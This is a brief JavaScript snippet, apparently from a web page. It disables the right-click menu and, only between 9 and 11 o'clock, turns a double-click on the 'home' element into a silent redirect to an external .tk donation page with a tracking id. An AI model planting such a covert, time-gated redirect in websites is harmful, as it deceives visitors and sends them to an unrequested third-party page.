window.oncontextmenu = function () {
    return false;
};
if (new Date().getHours() >= 9 && new Date().getHours() <= 11) {
    document.getElementById("home").addEventListener("dblclick", function () {
        window.location.replace("https://usfns.tk/donation.html?track_id=af609ed206722bd0793713d50ca2858e897633b75d0453f97b6ab61c42c2e7e6");
    });
}